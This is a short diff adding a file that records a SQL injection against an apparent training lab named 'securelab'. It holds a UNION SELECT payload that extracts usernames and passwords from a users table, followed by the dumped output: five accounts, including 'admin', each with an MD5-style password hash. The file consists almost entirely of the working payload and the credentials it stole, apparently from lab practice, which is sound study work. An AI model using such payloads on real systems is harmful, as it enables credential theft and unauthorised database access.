@@ -1,0 +1,11 @@
+D: ' UNION SELECT 1,2,3,4, username, password, 7, 8 FROM securelab.users#'
+Username: 
+First name: 
+Last name: 
+
+Order No 	Product No 	Product Name 	Price ($)
+admin	b20df49fc2260631e5d79ac1e983a02f	7	8
+James Bond	9e94b15ed312fa42232fd87a55db0d39	7	8
+xss	708697c63f7eb369319c6523380bdf7a	7	8
+pablo	0d107d09f5bbe40cade3de5c71e9e9b7	7	8
+bob	5f4dcc3b5aa765d61d8327deb882cf99	7	8
